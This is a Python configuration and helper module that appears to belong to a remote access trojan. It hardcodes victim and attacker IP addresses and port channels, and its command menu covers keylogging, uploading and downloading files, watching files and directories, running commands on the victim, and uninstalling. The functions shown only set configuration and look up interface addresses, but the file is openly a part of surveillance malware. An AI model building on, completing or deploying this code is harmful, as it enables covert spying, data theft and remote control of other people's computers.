import socket

from enum import Enum
from psutil import net_if_addrs

class Cfg:
    VICTIM_IP = '192.168.0.40'
    ATTACKER_IP = '192.168.0.143'
    IFACE = 'enp2s0'

CHANNELS = {
    1: { 'sport': 7001, 'dport': 8001 },
    2: { 'sport': 7002, 'dport': 8002 },
    3: { 'sport': 7003, 'dport': 8003 }
}

class Channel(Enum):
    MAIN = 1
    BACKGROUND = 2

OPTIONS_LIST = {
    'cn': '\t\tConnect to the victim ',
    'dc': '\t\tDisconnect from the victim',
    'sf': '<path> \tSend a file to the victim',
    'dl': '<path> \tDownload a file from the victim',
    'k+': '\t\tStart keylogger',
    'k-': '\t\tStop keylogger',
    'wf': '<path> \tWatch a file on the victim',
    'wd': '<path> \tWatch a directory on the victim',
    'rn': '<cmd> \tRun a command on the victim',
    'un': '\t\tUninstall',
    'ex': '\t\tExit'
}

def set_victimip(ip: str):
    Cfg.VICTIM_IP = ip

def set_attackerip(ip: str):
    Cfg.ATTACKER_IP = ip

def set_interface(iface: str):
    Cfg.IFACE = iface


def get_ip_address(ifname) -> str:
    interfaces = net_if_addrs()
    if ifname not in interfaces: return None
    
    for address in interfaces[ifname]:
        if address.family == socket.AF_INET:
            return address.address
            
    return None